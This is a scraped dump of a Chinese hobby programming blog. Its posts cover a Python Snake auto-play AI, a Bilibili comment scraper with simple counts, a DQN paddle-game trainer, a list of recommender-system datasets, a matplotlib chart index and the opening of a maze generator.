f.write('\\n') # print symbol for i in xrange(HEIGHT): for j in xrange(WIDTH): k = board[i*WIDTH+j] if k == UNDEFINED: f.write('# ') elif k == SNAKE: if i*WIDTH+j == snake[HEAD]: f.write('+ ') # 蛇头 elif i*WIDTH+j == snake[snake_size-1]: f.write('- ') # 蛇尾 else: f.write('* ') else: f.write(str(k)+' ') f.write('\\n') f.write('\\n')# 虚拟地运行一次，然后在调用处检查这次运行可否可行# 可行才真实运行。# 虚拟运行吃到食物后，得到虚拟下蛇在board的位置def virtual_shortest_move(): global snake, board, snake_size, tmpsnake, tmpboard, tmpsnake_size, food #f.write('i am in virtual\\n') tmpsnake_size = snake_size tmpsnake = snake[:] # 如果直接tmpsnake=snake，则两者指向同一处内存 tmpboard = board[:] # board中已经是各位置到达食物的路径长度了，不用再计算 board_reset(tmpsnake, tmpsnake_size, tmpboard) # test 打印tmpboard # for i in xrange(HEIGHT): # for j in xrange(WIDTH): # k = tmpboard[i*WIDTH+j] # f.write(str(k)+' ') # f.write('\\n') food_eated = False while not food_eated: board_refresh(food, tmpsnake, tmpboard) move = choose_shortest_safe_move(tmpsnake, tmpboard) shift_array(tmpsnake, tmpsnake_size) tmpsnake[HEAD] += move # 在蛇头前加入一个新的位置 #f.write('snake head: '+str(tmpsnake[HEAD])+'\\n') # 如果新加入的蛇头的位置正好是食物的位置 # 则长度加1，重置board，食物那个位置变为蛇的一部分(SNAKE) if tmpsnake[HEAD] == food: tmpsnake_size += 1 board_reset(tmpsnake, tmpsnake_size, tmpboard) # 虚拟运行后，蛇在board的位置(label101010) tmpboard[food] = SNAKE food_eated = True else: # 如果蛇头不是食物的位置，则新加入的位置为蛇头，最后一个变为空格 tmpboard[tmpsnake[HEAD]] = SNAKE tmpboard[tmpsnake[tmpsnake_size]] = UNDEFINED #f.write('i am out virtual\\n')# 如果蛇与食物间有路径，则调用本函数def find_safe_way(): global snake, board safe_move = ERR # 虚拟地运行一次，因为已经确保蛇与食物间有路径，所以执行有效 # 运行后得到虚拟下蛇在board中的位置，即tmpboard，见label101010 virtual_shortest_move() # 该函数唯一调用处 if is_tail_inside(): # 如果虚拟运行后，蛇头蛇尾间有通路，则选最短路运行(1步) return choose_shortest_safe_move(snake, board) safe_move = follow_tail() # 否则虚拟地follow_tail 1步，如果可以做到，返回true return safe_movecurses.initscr()win = curses.newwin(HEIGHT, WIDTH, 0, 0)win.keypad(1)curses.noecho()curses.curs_set(0)win.border(0)win.nodelay(1)win.addch(food/WIDTH, food%WIDTH, '@')f = file('log', 'w') while key != 27: win.border(0) win.addstr(0, 2, 's:' + str(score) + ' ') #win.addstr(0, WIDTH/2-3, ' SNAKE ') win.timeout(10) # 接收键盘输入，同时也使显示流畅 event = win.getch() key = key if event == -1 else event if snake_size &gt;= FIELD_SIZE: continue # 重置矩阵 board_reset(snake, snake_size, board) # 如果蛇可以吃到食物，board_refresh返回true # 并且board中除了蛇身(=SNAKE)，其它的元素值表示从该点运动到食物的最短路径长 if board_refresh(food, snake, board): best_move = find_safe_way() # find_safe_way的唯一调用处 f.write('find safe way: ' + str(best_move) + '\\n') else: best_move = follow_tail() f.write('follow tail: ' + str(best_move) +'\\n') if best_move == ERR: best_move = any_possible_move() f.write('any possible move: ' + str(best_move) + '\\n') # 上面一次思考，只得出一个方向，运行一步 if best_move != ERR: make_move(best_move) else: break f.close()curses.endwin()print(\"\\nScore - \" + str(score)) 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289# coding: utf-8import cursesfrom curses import KEY_RIGHT, KEY_LEFT, KEY_UP, KEY_DOWNfrom random import randint# 蛇运动的场地长宽HEIGHT = 10WIDTH = 20FIELD_SIZE = HEIGHT * WIDTH# 蛇头总是位于snake数组的第一个元素HEAD = 0# 用来代表不同东西的数字，由于矩阵上每个格子会处理成到达食物的路径长度，# 因此这三个变量间需要有足够大的间隔(&gt;HEIGHT*WIDTH)FOOD = 0UNDEFINED = (HEIGHT + 1) * (WIDTH + 1)SNAKE = 2 * UNDEFINED# 由于snake是一维数组，所以对应元素直接加上以下值就表示向四个方向移动LEFT = -1RIGHT = 1UP = -WIDTHDOWN = WIDTH# 错误码ERR = -1111# 用一维数组来表示二维的东西# board表示蛇运动的矩形场地# 初始化蛇头在(1,1)的地方，第0行，HEIGHT行，第0列，WIDTH列为围墙，不可用# 初始蛇长度为1board = [0] * FIELD_SIZEsnake = [0] * (FIELD_SIZE+1)snake[HEAD] = 1*WIDTH+1snake_size = 1# 与上面变量对应的临时变量，蛇试探性地移动时使用tmpboard = [0] * FIELD_SIZEtmpsnake = [0] * (FIELD_SIZE+1)tmpsnake[HEAD] = 1*WIDTH+1tmpsnake_size = 1# food:食物位置(0~FIELD_SIZE-1),初始在(3, 3)# best_move: 运动方向food = 3 * WIDTH + 3best_move = ERR# 运动方向数组mov = [LEFT, RIGHT, UP, DOWN]# 接收到的键 和 分数key = KEY_RIGHT score = 1 #分数也表示蛇长# 检查一个cell有没有被蛇身覆盖，没有覆盖则为free，返回truedef is_cell_free(idx, psize, psnake): return not (idx in psnake[:psize]) # 检查某个位置idx是否可向move方向运动def is_move_possible(idx, move): flag = False if move == LEFT: flag = True if idx%WIDTH &gt; 1 else False elif move == RIGHT: flag = True if idx%WIDTH &lt; (WIDTH-2) else False elif move == UP: flag = True if idx &gt; (2*WIDTH-1) else False # 即idx/WIDTH &gt; 1 elif move == DOWN: flag = True if idx &lt; (FIELD_SIZE-2*WIDTH) else False # 即idx/WIDTH &lt; HEIGHT-2 return flag# 重置board# board_refresh后，UNDEFINED值都变为了到达食物的路径长度# 如需要还原，则要重置它def board_reset(psnake, psize, pboard): for i in xrange(FIELD_SIZE): if i == food: pboard[i] = FOOD elif is_cell_free(i, psize, psnake): # 该位置为空 pboard[i] = UNDEFINED else: # 该位置为蛇身 pboard[i] = SNAKE # 广度优先搜索遍历整个board，# 计算出board中每个非SNAKE元素到达食物的路径长度def board_refresh(pfood, psnake, pboard): queue = [] queue.append(pfood) inqueue = [0] * FIELD_SIZE found = False # while循环结束后，除了蛇的身体， # 其它每个方格中的数字代码从它到食物的路径长度 while len(queue)!=0: idx = queue.pop(0) if inqueue[idx] == 1: continue inqueue[idx] = 1 for i in xrange(4): if is_move_possible(idx, mov[i]): if idx + mov[i] == psnake[HEAD]: found = True if pboard[idx+mov[i]] &lt; SNAKE: # 如果该点不是蛇的身体 if pboard[idx+mov[i]] &gt; pboard[idx]+1: pboard[idx+mov[i]] = pboard[idx] + 1 if inqueue[idx+mov[i]] == 0: queue.append(idx+mov[i]) return found# 从蛇头开始，根据board中元素值，# 从蛇头周围4个领域点中选择最短路径def choose_shortest_safe_move(psnake, pboard): best_move = ERR min = SNAKE for i in xrange(4): if is_move_possible(psnake[HEAD], mov[i]) and pboard[psnake[HEAD]+mov[i]]&lt;min: min = pboard[psnake[HEAD]+mov[i]] best_move = mov[i] return best_move# 从蛇头开始，根据board中元素值，# 从蛇头周围4个领域点中选择最远路径def choose_longest_safe_move(psnake, pboard): best_move = ERR max = -1 for i in xrange(4): if is_move_possible(psnake[HEAD], mov[i]) and pboard[psnake[HEAD]+mov[i]]&lt;UNDEFINED and pboard[psnake[HEAD]+mov[i]]&gt;max: max = pboard[psnake[HEAD]+mov[i]] best_move = mov[i] return best_move# 检查是否可以追着蛇尾运动，即蛇头和蛇尾间是有路径的# 为的是避免蛇头陷入死路# 虚拟操作，在tmpboard,tmpsnake中进行def is_tail_inside(): global tmpboard, tmpsnake, food, tmpsnake_size tmpboard[tmpsnake[tmpsnake_size-1]] = 0 # 虚拟地将蛇尾变为食物(因为是虚拟的，所以在tmpsnake,tmpboard中进行) tmpboard[food] = SNAKE # 放置食物的地方，看成蛇身 result = board_refresh(tmpsnake[tmpsnake_size-1], tmpsnake, tmpboard) # 求得每个位置到蛇尾的路径长度 for i in xrange(4): # 如果蛇头和蛇尾紧挨着，则返回False。即不能follow_tail，追着蛇尾运动了 if is_move_possible(tmpsnake[HEAD], mov[i]) and tmpsnake[HEAD]+mov[i]==tmpsnake[tmpsnake_size-1] and tmpsnake_size&gt;3: result = False return result# 让蛇头朝着蛇尾运行一步# 不管蛇身阻挡，朝蛇尾方向运行def follow_tail(): global tmpboard, tmpsnake, food, tmpsnake_size tmpsnake_size = snake_size tmpsnake = snake[:] board_reset(tmpsnake, tmpsnake_size, tmpboard) # 重置虚拟board tmpboard[tmpsnake[tmpsnake_size-1]] = FOOD # 让蛇尾成为食物 tmpboard[food] = SNAKE # 让食物的地方变成蛇身 board_refresh(tmpsnake[tmpsnake_size-1], tmpsnake, tmpboard) # 求得各个位置到达蛇尾的路径长度 tmpboard[tmpsnake[tmpsnake_size-1]] = SNAKE # 还原蛇尾 return choose_longest_safe_move(tmpsnake, tmpboard) # 返回运行方向(让蛇头运动1步)# 在各种方案都不行时，随便找一个可行的方向来走(1步),def any_possible_move(): global food , snake, snake_size, board best_move = ERR board_reset(snake, snake_size, board) board_refresh(food, snake, board) min = SNAKE for i in xrange(4): if is_move_possible(snake[HEAD], mov[i]) and board[snake[HEAD]+mov[i]]&lt;min: min = board[snake[HEAD]+mov[i]] best_move = mov[i] return best_movedef shift_array(arr, size): for i in xrange(size, 0, -1): arr[i] = arr[i-1]def new_food(): global food, snake_size cell_free = False while not cell_free: w = randint(1, WIDTH-2) h = randint(1, HEIGHT-2) food = h * WIDTH + w cell_free = is_cell_free(food, snake_size, snake) win.addch(food/WIDTH, food%WIDTH, '@')# 真正的蛇在这个函数中，朝pbest_move走1步def make_move(pbest_move): global key, snake, board, snake_size, score shift_array(snake, snake_size) snake[HEAD] += pbest_move # 按esc退出，getch同时保证绘图的流畅性，没有它只会看到最终结果 win.timeout(10) event = win.getch() key = key if event == -1 else event if key == 27: return p = snake[HEAD] win.addch(p/WIDTH, p%WIDTH, '*') # 如果新加入的蛇头就是食物的位置 # 蛇长加1，产生新的食物，重置board(因为原来那些路径长度已经用不上了) if snake[HEAD] == food: board[snake[HEAD]] = SNAKE # 新的蛇头 snake_size += 1 score += 1 if snake_size &lt; FIELD_SIZE: new_food() else: # 如果新加入的蛇头不是食物的位置 board[snake[HEAD]] = SNAKE # 新的蛇头 board[snake[snake_size]] = UNDEFINED # 蛇尾变为空格 win.addch(snake[snake_size]/WIDTH, snake[snake_size]%WIDTH, ' ')# 虚拟地运行一次，然后在调用处检查这次运行可否可行# 可行才真实运行。# 虚拟运行吃到食物后，得到虚拟下蛇在board的位置def virtual_shortest_move(): global snake, board, snake_size, tmpsnake, tmpboard, tmpsnake_size, food tmpsnake_size = snake_size tmpsnake = snake[:] # 如果直接tmpsnake=snake，则两者指向同一处内存 tmpboard = board[:] # board中已经是各位置到达食物的路径长度了，不用再计算 board_reset(tmpsnake, tmpsnake_size, tmpboard) food_eated = False while not food_eated: board_refresh(food, tmpsnake, tmpboard) move = choose_shortest_safe_move(tmpsnake, tmpboard) shift_array(tmpsnake, tmpsnake_size) tmpsnake[HEAD] += move # 在蛇头前加入一个新的位置 # 如果新加入的蛇头的位置正好是食物的位置 # 则长度加1，重置board，食物那个位置变为蛇的一部分(SNAKE) if tmpsnake[HEAD] == food: tmpsnake_size += 1 board_reset(tmpsnake, tmpsnake_size, tmpboard) # 虚拟运行后，蛇在board的位置(label101010) tmpboard[food] = SNAKE food_eated = True else: # 如果蛇头不是食物的位置，则新加入的位置为蛇头，最后一个变为空格 tmpboard[tmpsnake[HEAD]] = SNAKE tmpboard[tmpsnake[tmpsnake_size]] = UNDEFINED# 如果蛇与食物间有路径，则调用本函数def find_safe_way(): global snake, board safe_move = ERR # 虚拟地运行一次，因为已经确保蛇与食物间有路径，所以执行有效 # 运行后得到虚拟下蛇在board中的位置，即tmpboard，见label101010 virtual_shortest_move() # 该函数唯一调用处 if is_tail_inside(): # 如果虚拟运行后，蛇头蛇尾间有通路，则选最短路运行(1步) return choose_shortest_safe_move(snake, board) safe_move = follow_tail() # 否则虚拟地follow_tail 1步，如果可以做到，返回true return safe_movecurses.initscr()win = curses.newwin(HEIGHT, WIDTH, 0, 0)win.keypad(1)curses.noecho()curses.curs_set(0)win.border(0)win.nodelay(1)win.addch(food/WIDTH, food%WIDTH, '@') while key != 27: win.border(0) win.addstr(0, 2, 'S:' + str(score) + ' ') win.timeout(10) # 接收键盘输入，同时也使显示流畅 event = win.getch() key = key if event == -1 else event # 重置矩阵 board_reset(snake, snake_size, board) # 如果蛇可以吃到食物，board_refresh返回true # 并且board中除了蛇身(=SNAKE)，其它的元素值表示从该点运动到食物的最短路径长 if board_refresh(food, snake, board): best_move = find_safe_way() # find_safe_way的唯一调用处 else: best_move = follow_tail() if best_move == ERR: best_move = any_possible_move() # 上面一次思考，只得出一个方向，运行一步 if best_move != ERR: make_move(best_move) else: break curses.endwin()print(\"\\nScore - \" + str(score))","link":"/2019/10/21/当你的贪吃蛇吃满屏幕后/"},{"title":"b站爱5预告片评论简单分析","text":"1.数据爬取借用cid 123456789101112131415161718from bs4 import BeautifulSoupimport pandas as pd import requestsurl = \"http://comment.bilibili.com/123519261.xml\"html = requests.get(url)html.encoding = \"utf8\"soup = BeautifulSoup(html.text, \"lxml\")results = soup.find_all(\"d\")comments = [comment.text for comment in results]comments_dict = {\"comments\": comments}df = pd.DataFrame(comments_dict)df.to_csv(\"bilibili_data.csv\", encoding=\"utf-8-sig\")print(\"爬取完成！\") 2.数据分析2.1数据查看12345import pandas as pddata = pd.read_csv(\"bilibili_data.csv\")del(data[\"Unnamed: 0\"])data.head(5) .dataframe tbody tr th:only-of-type { vertical-align: middle; } .dataframe tbody tr th { vertical-align: top; } .dataframe thead th { text-align: right; } comments 0 啊啊啊啊啊啊啊 1 高三 2 高二加1 3 可惜了关谷，，悠悠 4 没多少戏应该是请不起了 2.2怀念度（年龄）分析123456789101112131415161718192021222324252627282930313233dayicount = 0daercount = 0dasancount = 0gaoyicount = 0gaoercount = 0gaosancount = 0xiaoxuecount = 0chuzhongcount = 0for i in range(len(data)): if \"大一\" in data[\"comments\"][i]: dayicount += 1 elif \"大二\" in data[\"comments\"][i]: daercount += 1 elif \"大三\" in data[\"comments\"][i]: dasancount += 1 elif \"高一\" in data[\"comments\"][i]: gaoyicount += 1 elif \"高二\" in data[\"comments\"][i]: gaoercount += 1 elif \"高三\" in data[\"comments\"][i]: gaosancount += 1 elif \"小学\" in data[\"comments\"][i]: xiaoxuecount += 1 elif \"初中\" in data[\"comments\"][i]: chuzhongcount += 1print(\"大一：\",dayicount)print(\"大二：\",daercount)print(\"大三：\",dasancount)print(\"高一：\",gaoyicount)print(\"高二：\",gaoercount)print(\"高三：\",gaosancount)print(\"小学：\",xiaoxuecount)print(\"初中：\",chuzhongcount) 大一： 60 大二： 34 大三： 19 高一： 72 高二： 59 高三： 70 小学： 5 初中： 21000条弹幕就有这么多怀念青春的人 哈哈哈 3.源文件下载oneindex下载","link":"/2019/10/21/b站爱5预告片评论简单分析/"},{"title":"排序动画演示","text":"将杂乱无章的数据元素，通过一定的方法按关键字顺序排列的过程叫做排序。 1.插入排序 2.堆排序 3.希尔排序 4.计数排序 5.快速排序 6.桶排序 7.归并排序 8.基数排序 9.选择排序 10.冒泡排序","link":"/2019/10/21/排序动画演示/"},{"title":"河南理工大学110周年校庆剪影","text":"","link":"/2019/10/20/河南理工大学110周年校庆剪影/"},{"title":"使用深度学习训练一个游戏","text":"运行环境 pygame numpy opencv tensorflow 提示 运行报错1AttributeError: module 'tensorflow' has no attribute 'mul' 解决方案： TensorFlow的“mul”函数变成“multiply”函数了。TensorFlow版本不同，使用的函数不同。 将mul改为multiply。 运行报错 1saver.save(sess, \"model.ckpt\") 改为相对路径保存 1saver.save(sess, \"./model.ckpt\") 训练123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200import pygameimport randomfrom pygame.locals import *import numpy as npfrom collections import dequeimport tensorflow as tf import cv2 BLACK = (0 ,0 ,0 )WHITE = (255,255,255) SCREEN_SIZE = [320,400]BAR_SIZE = [50, 5]BALL_SIZE = [15, 15] # 神经网络的输出MOVE_STAY = [1, 0, 0]MOVE_LEFT = [0, 1, 0]MOVE_RIGHT = [0, 0, 1] class Game(object): def __init__(self): pygame.init() self.clock = pygame.time.Clock() self.screen = pygame.display.set_mode(SCREEN_SIZE) pygame.display.set_caption('Simple Game') self.ball_pos_x = SCREEN_SIZE[0]//2 - BALL_SIZE[0]/2 self.ball_pos_y = SCREEN_SIZE[1]//2 - BALL_SIZE[1]/2 self.ball_dir_x = -1 # -1 = left 1 = right self.ball_dir_y = -1 # -1 = up 1 = down self.ball_pos = pygame.Rect(self.ball_pos_x, self.ball_pos_y, BALL_SIZE[0], BALL_SIZE[1]) self.bar_pos_x = SCREEN_SIZE[0]//2-BAR_SIZE[0]//2 self.bar_pos = pygame.Rect(self.bar_pos_x, SCREEN_SIZE[1]-BAR_SIZE[1], BAR_SIZE[0], BAR_SIZE[1]) # action是MOVE_STAY、MOVE_LEFT、MOVE_RIGHT # ai控制棒子左右移动；返回游戏界面像素数和对应的奖励。(像素-&gt;奖励-&gt;强化棒子往奖励高的方向移动) def step(self, action): if action == MOVE_LEFT: self.bar_pos_x = self.bar_pos_x - 2 elif action == MOVE_RIGHT: self.bar_pos_x = self.bar_pos_x + 2 else: pass if self.bar_pos_x &lt; 0: self.bar_pos_x = 0 if self.bar_pos_x &gt; SCREEN_SIZE[0] - BAR_SIZE[0]: self.bar_pos_x = SCREEN_SIZE[0] - BAR_SIZE[0] self.screen.fill(BLACK) self.bar_pos.left = self.bar_pos_x pygame.draw.rect(self.screen, WHITE, self.bar_pos) self.ball_pos.left += self.ball_dir_x * 2 self.ball_pos.bottom += self.ball_dir_y * 3 pygame.draw.rect(self.screen, WHITE, self.ball_pos) if self.ball_pos.top &lt;= 0 or self.ball_pos.bottom &gt;= (SCREEN_SIZE[1] - BAR_SIZE[1]+1): self.ball_dir_y = self.ball_dir_y * -1 if self.ball_pos.left &lt;= 0 or self.ball_pos.right &gt;= (SCREEN_SIZE[0]): self.ball_dir_x = self.ball_dir_x * -1 reward = 0 if self.bar_pos.top &lt;= self.ball_pos.bottom and (self.bar_pos.left &lt; self.ball_pos.right and self.bar_pos.right &gt; self.ball_pos.left): reward = 1 # 击中奖励 elif self.bar_pos.top &lt;= self.ball_pos.bottom and (self.bar_pos.left &gt; self.ball_pos.right or self.bar_pos.right &lt; self.ball_pos.left): reward = -1 # 没击中惩罚 # 获得游戏界面像素 screen_image = pygame.surfarray.array3d(pygame.display.get_surface()) pygame.display.update() # 返回游戏界面像素和对应的奖励 return reward, screen_image # learning_rateLEARNING_RATE = 0.99# 更新梯度INITIAL_EPSILON = 1.0FINAL_EPSILON = 0.05# 测试观测次数EXPLORE = 500000 OBSERVE = 50000# 存储过往经验大小REPLAY_MEMORY = 500000 BATCH = 100 output = 3 # 输出层神经元数。代表3种操作-MOVE_STAY:[1, 0, 0] MOVE_LEFT:[0, 1, 0] MOVE_RIGHT:[0, 0, 1]input_image = tf.placeholder(\"float\", [None, 80, 100, 4]) # 游戏像素action = tf.placeholder(\"float\", [None, output]) # 操作 # 定义CNN-卷积神经网络 参考:http://blog.topspeedsnail.com/archives/10451def convolutional_neural_network(input_image): weights = {'w_conv1':tf.Variable(tf.zeros([8, 8, 4, 32])), 'w_conv2':tf.Variable(tf.zeros([4, 4, 32, 64])), 'w_conv3':tf.Variable(tf.zeros([3, 3, 64, 64])), 'w_fc4':tf.Variable(tf.zeros([3456, 784])), 'w_out':tf.Variable(tf.zeros([784, output]))} biases = {'b_conv1':tf.Variable(tf.zeros([32])), 'b_conv2':tf.Variable(tf.zeros([64])), 'b_conv3':tf.Variable(tf.zeros([64])), 'b_fc4':tf.Variable(tf.zeros([784])), 'b_out':tf.Variable(tf.zeros([output]))} conv1 = tf.nn.relu(tf.nn.conv2d(input_image, weights['w_conv1'], strides = [1, 4, 4, 1], padding = \"VALID\") + biases['b_conv1']) conv2 = tf.nn.relu(tf.nn.conv2d(conv1, weights['w_conv2'], strides = [1, 2, 2, 1], padding = \"VALID\") + biases['b_conv2']) conv3 = tf.nn.relu(tf.nn.conv2d(conv2, weights['w_conv3'], strides = [1, 1, 1, 1], padding = \"VALID\") + biases['b_conv3']) conv3_flat = tf.reshape(conv3, [-1, 3456]) fc4 = tf.nn.relu(tf.matmul(conv3_flat, weights['w_fc4']) + biases['b_fc4']) output_layer = tf.matmul(fc4, weights['w_out']) + biases['b_out'] return output_layer # 深度强化学习入门: https://www.nervanasys.com/demystifying-deep-reinforcement-learning/# 训练神经网络def train_neural_network(input_image): predict_action = convolutional_neural_network(input_image) argmax = tf.placeholder(\"float\", [None, output]) gt = tf.placeholder(\"float\", [None]) action = tf.reduce_sum(tf.multiply(predict_action, argmax), reduction_indices = 1) cost = tf.reduce_mean(tf.square(action - gt)) optimizer = tf.train.AdamOptimizer(1e-6).minimize(cost) game = Game() D = deque() _, image = game.step(MOVE_STAY) # 转换为灰度值 image = cv2.cvtColor(cv2.resize(image, (100, 80)), cv2.COLOR_BGR2GRAY) # 转换为二值 ret, image = cv2.threshold(image, 1, 255, cv2.THRESH_BINARY) input_image_data = np.stack((image, image, image, image), axis = 2) with tf.Session() as sess: sess.run(tf.initialize_all_variables()) saver = tf.train.Saver() n = 0 epsilon = INITIAL_EPSILON while True: action_t = predict_action.eval(feed_dict = {input_image : [input_image_data]})[0] argmax_t = np.zeros([output], dtype=np.int) if(random.random() &lt;= INITIAL_EPSILON): maxIndex = random.randrange(output) else: maxIndex = np.argmax(action_t) argmax_t[maxIndex] = 1 if epsilon &gt; FINAL_EPSILON: epsilon -= (INITIAL_EPSILON - FINAL_EPSILON) / EXPLORE #for event in pygame.event.get(): macOS需要事件循环，否则白屏 # if event.type == QUIT: # pygame.quit() # sys.exit() reward, image = game.step(list(argmax_t)) image = cv2.cvtColor(cv2.resize(image, (100, 80)), cv2.COLOR_BGR2GRAY) ret, image = cv2.threshold(image, 1, 255, cv2.THRESH_BINARY) image = np.reshape(image, (80, 100, 1)) input_image_data1 = np.append(image, input_image_data[:, :, 0:3], axis = 2) D.append((input_image_data, argmax_t, reward, input_image_data1)) if len(D) &gt; REPLAY_MEMORY: D.popleft() if n &gt; OBSERVE: minibatch = random.sample(D, BATCH) input_image_data_batch = [d[0] for d in minibatch] argmax_batch = [d[1] for d in minibatch] reward_batch = [d[2] for d in minibatch] input_image_data1_batch = [d[3] for d in minibatch] gt_batch = [] out_batch = predict_action.eval(feed_dict = {input_image : input_image_data1_batch}) for i in range(0, len(minibatch)): gt_batch.append(reward_batch[i] + LEARNING_RATE * np.max(out_batch[i])) optimizer.run(feed_dict = {gt : gt_batch, argmax : argmax_batch, input_image : input_image_data_batch}) input_image_data = input_image_data1 n = n+1 if n % 10000 == 0: saver.save(sess, './game.cpk', global_step = n) # 保存模型 print(n, \"epsilon:\", epsilon, \" \" ,\"action:\", maxIndex, \" \" ,\"reward:\", reward) train_neural_network(input_image) 运行示例","link":"/2019/10/20/使用深度学习训练一个游戏/"},{"title":"推荐系统全数据集","text":"这些数据集在可作为基准的推荐系统中非常流行。 Douban：http://socialcomputing.asu.edu/datasets/Douban 这是一个匿名的豆瓣数据集，包含129,490个独立用户和58,541个独立电影条目。 Epinions：http://www.trustlet.org/epinions.html Epinions是一个人们可以评论产品的网站。 Flixster：http://socialcomputing.asu.edu/datasets/Flixster Flixster是一个社交电影网站，允许用户分享电影评级，发现新电影，并与其他有类似电影品味的人见面。 CiaoDVD：https://www.librec.net/datasets.html CiaoDVD是从dvd.ciao.co.中抓取的2013年12月英国网站整个dvd类别的数据集。 MACLab：http://mac.citi.sinica.edu.tw/LJ#.VRGYfOHlZ40 这个项目的目的是研究用户的情绪和音乐情绪。 DEAPdataset：http://www.eecs.qmul.ac.uk/mmv/datasets/deap/index.html 使用脑电图、生理和视频信号进行情绪分析的数据集。 MyPersonalityDataset：http://mypersonality.org/wiki/doku.php myPersonality是一个很受欢迎的Facebook应用程序，它允许用户进行真实的心理测试，并允许我们(在征得同意的情况下)记录他们的心理和Facebook资料。目前，我们的数据库包含超过600万个测试结果，以及超过400万个Facebook个人简介。 Bibsonomy：http://www.kde.cs.uni-kassel.de/bibsonomy/dumps 社交书签系统中的标签推荐。 Delicious：http://www.dai-labor.de/en/competence_centers/irml/datasets/ plista新闻推荐数据集，美味可口。 Movielens：https://grouplens.org/datasets/movielens/ 稳定的基准数据集。2000万个评分和46.5万个标签应用程序被13.8万用户应用于2.7万部电影。包括标签基因组数据，1100个标签的1200万个相关性得分。 Jester：http://eigentaste.berkeley.edu/dataset/ 来自小丑在线笑话推荐系统的匿名评级。 BookCrossing：http://www2.informatik.uni-freiburg.de/~cziegler/BX/ Book-Crossing数据集。 LastFM：https://grouplens.org/datasets/hetrec-2011/ 来自1892个用户的92,800张艺术家录音。 Wikipedia：https://en.wikipedia.org/wiki/Wikipedia:Database_download#English-language_Wikipedia 维基百科向感兴趣的用户提供所有可用内容的免费拷贝。这些数据库可用于镜像、个人使用、非正式备份、脱机使用或数据库查询。 OpenStreetMap：http://planet.openstreetmap.org/planet/full-history/ 这里找到的文件是OpenStreetMap.org数据库的完整副本，包括编辑历史。这些都是在Open Data Commons Open Database License 1.0许可下发布的。 PythonGitCode：https://github.com/lab41/hermes Hermes是Lab41对推荐系统的一次尝试。通过分析多种推荐系统算法在不同数据集上的性能，探讨了如何为新的应用选择推荐系统。 Gist：https://gist.github.com/entaroadun/1653794 为机器学习推荐和评级的公共数据集。 Yelp：https://www.yelp.com/dataset Yelp数据集是用于个人、教育和学术目的的业务、评论和用户数据的子集。可以在JSON和SQL文件中使用，在你学习如何制作移动应用程序时，可以使用它来教学生关于数据库、学习NLP或示例生产数据。 AmazonReviews：http://jmcauley.ucsd.edu/data/amazon/ 该数据集包含来自Amazon的产品评论和元数据，包括1996年5月至2014年7月期间的1.428亿个评论。这个数据集包括评论(评级、文本、帮助投票)、产品元数据(描述、类别信息、价格、品牌和图像特性)和链接(也查看/购买图表)。 CiteULike：http://www.citeulike.org/faq/data.adp CiteULike数据库对不同领域的研究人员都有潜在的用处。物理学家和计算机科学家对分析数据结构表示了兴趣，并经常要求提供数据集。以前，这是在一个特别的基础上完成的，它依赖于我们记住更新数据文件。现在，有一个自动的过程，每天晚上运行，生成一个快照摘要，说明用哪些标签发布了哪些文章。 Taobao：https://tianchi.aliyun.com/datalab/dataSet.htm?spm=5176.100073.888.13.62f83f62aOlMEI&amp;id=1 该数据集包含了匿名用户在“双十一”前后6个月的购物记录，以及表明他们是否重复购买的标签信息。由于隐私问题，数据采集存在偏差，因此该数据集的统计结果会与天猫的实际情况相背离。","link":"/2019/10/17/推荐系统全数据集/"},{"title":"全50张matplotlib图","text":"不好说些什么… 1.关联 散点图带边界的气泡图带线性回归最佳拟合线的散点图抖动图计数图边缘直方图边缘箱形图相关图矩阵图 2.偏差 发散型条形图发散型文本发散型包点图带标记的发散型棒棒糖图面积图 3.排序 有序条形图棒棒糖图包点图坡度图哑铃图 4.分布 连续变量的直方图类型变量的直方图密度图直方密度线图Joy Plot分布式包点图包点+箱形图Dot + Box Plot小提琴图人口金字塔分类图 5.组成 华夫饼图饼图树形图条形图 6.变化 时间序列图带波峰波谷标记的时序图自相关和部分自相关图交叉相关图时间序列分解图多个时间序列使用辅助Y轴来绘制不同范围的图形带有误差带的时间序列堆积面积图未堆积的面积图日历热力图季节图 7.分组 树状图簇状图安德鲁斯曲线平行坐标","link":"/2019/10/16/全50张matplotlib图/"},{"title":"阿里云栖大会-程序员吐槽大会","text":"啊~你的代码好强（你确实很弱，但我不能说）","link":"/2019/10/15/阿里云栖大会-程序员吐槽大会/"},{"title":"python生成迷宫","text":"算法简介: 生成一张网格，把网格里面的所有边都存进一个列表edgeList里面. 从(0, 0)开始，做DFS。每次DFS的时候，随机地选择四周一个没有走过的格子，凿墙过去，把道路打通。凿墙的时候，把edgeList列表中相对应的那堵墙删除掉。 将剩下的没有凿开过的墙画出来，就是一个完整的迷宫了。 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091929394import sysimport matplotlib.pyplot as pltfrom random import randintWIDTH = 60HEIGHT = 40sys.setrecursionlimit(WIDTH * HEIGHT)def initVisitedList(): visited = [] for y in range(HEIGHT): line = [] for x in range(WIDTH): line.append(False) visited.append(line) return visiteddef drawLine(x1, y1, x2, y2): plt.plot([x1, x2], [y1, y2], color=\"black\")def removeLine(x1, y1, x2, y2): plt.plot([x1, x2], [y1, y2], color=\"white\")def get_edges(x, y): result = [] result.append((x, y, x, y+1)) result.append((x+1, y, x+1, y+1)) result.append((x, y, x+1, y)) result.append((x, y+1, x+1, y+1)) return resultdef drawCell(x, y): edges = get_edges(x, y) for item in edges: drawLine(item[0], item[1], item[2], item[3])def getCommonEdge(cell1_x, cell1_y, cell2_x, cell2_y): edges1 = get_edges(cell1_x, cell1_y) edges2 = set(get_edges(cell2_x, cell2_y)) for edge in edges1: if edge in edges2: return edge return Nonedef initEdgeList(): edges = set() for x in range(WIDTH): for y in range(HEIGHT): 